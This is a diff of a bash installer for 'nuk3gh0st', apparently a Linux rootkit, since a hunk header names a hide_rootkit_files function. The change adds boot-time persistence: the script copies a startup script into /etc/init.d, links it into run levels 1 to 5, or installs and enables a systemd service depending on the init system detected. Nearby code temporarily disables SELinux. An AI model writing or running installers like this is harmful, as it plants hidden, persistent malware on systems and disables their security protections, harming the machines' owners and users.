@@ -16,13 +16,6 @@ function print_banner {
 	echo ""
 }
 
-function create_systemd_service {
-	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
-	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
-	cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
-	echo ""
-}
-
 function enable_selinux {
 	echo -e "${item} Reenabling SELINUX"
 	echo -e "   ${purple} cmd: setenforce 1${endColor}"
@@ -34,6 +27,13 @@ function disable_selinux {
 	echo -e "${item} Disabling SELINUX temporarily"
 	echo -e "   ${purple} cmd: setenforce 0${endColor}"
 	setenforce 0
+	echo ""
+}
+
+function create_systemd_service {
+	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
+	cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
 	echo ""
 }
 
@@ -53,14 +53,41 @@ function enable_systemd_service {
 	#echo ""
 }
 
+function create_init_service {
+	echo -e "${item} Coping nuk3gh0st.startup to /etc/init.d/ (sysv-init startup script directory)"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.startup /etc/init.d/nuk3gh0st.startup${endColor}"
+	cp /usr/share/nuk3gh0st/nuk3gh0st.startup /etc/init.d/nuk3gh0st.startup
+	echo ""
+}
+
+function create_rc_symlinks {
+	echo -e "${item} Create symbolic links of nuk3gh0st.startup for run levels from 1 to 5"
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/nuk3gh0st.startup /etc/rc1.d/S99nuk3gh0st.startup${endColor}"
+	ln -s /etc/init.d/nuk3gh0st.startup /etc/rc1.d/S99nuk3gh0st.startup
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/nuk3gh0st.startup /etc/rc2.d/S99nuk3gh0st.startup${endColor}"
+	ln -s /etc/init.d/nuk3gh0st.startup /etc/rc2.d/S99nuk3gh0st.startup
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/nuk3gh0st.startup /etc/rc3.d/S99nuk3gh0st.startup${endColor}"
+	ln -s /etc/init.d/nuk3gh0st.startup /etc/rc3.d/S99nuk3gh0st.startup
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/nuk3gh0st.startup /etc/rc4.d/S99nuk3gh0st.startup${endColor}"
+	ln -s /etc/init.d/nuk3gh0st.startup /etc/rc4.d/S99nuk3gh0st.startup
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/nuk3gh0st.startup /etc/rc5.d/S99nuk3gh0st.startup${endColor}"
+	ln -s /etc/init.d/nuk3gh0st.startup /etc/rc5.d/S99nuk3gh0st.startup
+}
+
 function enable_startup_service {
 	echo -e "${item} Detecting init system..."
 	if [[ `/sbin/init --version` =~ upstart ]]; then 
 		echo -e "${item} Init system is upstart"
+		create_init_service
+		create_rc_symlinks
 	elif [[ `systemctl` =~ -\.mount ]]; then 
 		echo -e "${item} Init system is systemd"
+		create_systemd_service
+		enable_systemd_service
 	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then 
 		echo -e "${item} Init system is sysv-init"
+		create_init_service
+		create_rc_symlinks
 	else 
 		echo cannot tell dos; 
 	fi
@@ -100,7 +127,6 @@ function hide_rootkit_files {
 }
 
 print_banner
-create_systemd_service
 echo -e "${item} Checking if SELINUX is enabled"
 if [ -f /usr/sbin/semanage ]; then
 	echo -e "${item} SELINUX is enabled"
